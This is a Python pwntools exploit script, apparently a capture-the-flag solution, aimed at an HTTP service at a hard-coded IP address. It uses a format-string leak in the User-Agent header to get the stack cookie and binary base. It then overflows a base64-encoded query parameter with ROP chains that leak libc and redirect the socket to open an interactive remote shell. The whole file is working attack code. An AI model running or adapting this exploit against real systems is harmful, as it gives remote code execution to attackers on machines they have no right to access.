#!/usr/bin/env python2
from pwn import *

host=("199.247.6.180",10000)
#cookie offset: 72
#eip offset: 88
pad="A"*72

pad8=lambda x:x+("\x00"*(8-len(x)))
DUMMY='AAAAAAAA'

RESPOND_OFF=0x195F
PUTS_OFF=0xC90
DUP2_OFF=0xCE0
FFLUSH_OFF=0xD70

POP_RSI=0x1d99  #pop r15; ret
POP_RDI=0x1d9b
JMP_RAX=0xe9f
INT3=0x15D0

PUTS_GOT=0x202ee8


# LIBC DEPENDEND GADGETS
#PUTS_OFF_LIBC=0x72a40
#ONE_GADGET=0x45200 #rax == NULL
#POP_RDX_RCX_RBX=0xe297e
ONE_GADGET=0x3f306
PUTS_OFF_LIBC=0x68f90
#############################

leakstr="User-Agent: ^^^^%p||||%7$p^^^^\r\n"


#0x2006
def make_req(rstr,hdr_flds=""):
    p=remote(*host,level="error")
    p.sendline("GET /?toy={} HTTP/1.1\r\n{}\r".format(b64e(rstr),hdr_flds))
    try:
        return p.recvall()
    except EOFError:
        return None
    finally:
        p.close()



base,cookie=map(lambda x:int(x,16),make_req("A",leakstr).split("^^^^")[1].split("||||"))
base-=0x2006

log.success("stack cookie = {}".format(hex(cookie)))
log.success("binary base = {}".format(hex(base)))

#ROP chain: dup2(4,1) puts(PUTS_GOT) fflush(0) respond(4)
libcleak_rop=   p64(base+POP_RDI)+p64(4)+p64(base+POP_RSI)+p64(1)+DUMMY+p64(base+DUP2_OFF)
libcleak_rop+=  p64(base+POP_RDI)+p64(base+PUTS_GOT)+p64(base+PUTS_OFF)
libcleak_rop+=  p64(base+POP_RDI)+p64(0)+p64(base+FFLUSH_OFF)
libcleak_rop+=  p64(base+POP_RDI)+p64(4)+p64(base+RESPOND_OFF)+p64(0xdeadbeef)

#raw_input()

p=remote(*host)
p.sendline("GET /?toy={} HTTP/1.1\r\n\r".format(b64e(pad+p64(cookie)+DUMMY+libcleak_rop)))
libc_base=u64(pad8(p.recvline()[:-1]))-PUTS_OFF_LIBC

log.success("libc base = {}".format(hex(libc_base)))

#ROP chain: dup2(4,3) dup2(4,0) ONE_GADGET
rce_rop=    p64(base+POP_RDI)+p64(4)+p64(base+POP_RSI)+p64(3)+DUMMY+p64(base+DUP2_OFF)
rce_rop+=   p64(base+POP_RDI)+p64(4)+p64(base+POP_RSI)+p64(0)+DUMMY+p64(base+DUP2_OFF)
rce_rop+=   p64(libc_base+ONE_GADGET)


p.sendline("GET /?toy={} HTTP/1.1\r\n\r".format(b64e(pad+p64(cookie)+DUMMY+rce_rop)))
p.interactive()
